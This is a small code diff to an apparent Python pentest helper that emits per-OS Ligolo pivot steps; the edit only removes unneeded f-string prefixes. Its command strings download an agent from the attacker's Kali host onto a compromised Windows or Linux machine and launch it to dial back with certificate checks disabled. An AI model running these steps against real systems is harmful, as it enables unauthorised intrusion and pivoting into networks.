@@ -74,14 +74,14 @@ def _clean_routes(routes: list[str]) -> list[str]:
 
 def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
     # OS-specific delivery + launch of the agent on the compromised pivot host — the transfer is the
-    # step people trip on, so it's spelled out per OS. The Linux run line stays `./agent -connect ...`.
+    # step people trip on, so it's spelled out per OS. The Linux run line stays `./agent -connect`.
     if agent_os == "windows":
         return LigoloStep(
             2,
             "Deliver + run the agent on the Windows pivot",
             "Kali → Windows pivot",
             [
-                f"python3 -m http.server 8000                                 # on Kali: serve agent.exe",  # noqa: E501
+                "python3 -m http.server 8000                                 # on Kali: serve agent.exe",  # noqa: E501
                 f"iwr -Uri http://{ip}:8000/agent.exe -OutFile $env:TEMP\\agent.exe   # on pivot (PowerShell)",  # noqa: E501
                 f"& $env:TEMP\\agent.exe -connect {ip}:{port} -ignore-cert    # on pivot: dial back",  # noqa: E501
             ],
@@ -94,7 +94,7 @@ def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
         "Deliver + run the agent on the Linux pivot",
         "Kali → Linux pivot",
         [
-            f"python3 -m http.server 8000                        # on Kali: serve the agent binary",  # noqa: E501
+            "python3 -m http.server 8000                        # on Kali: serve the agent binary",  # noqa: E501
             f"wget http://{ip}:8000/agent -O agent && chmod +x agent   # on the Linux pivot",
             f"./agent -connect {ip}:{port} -ignore-cert          # on the Linux pivot: dial back",
         ],
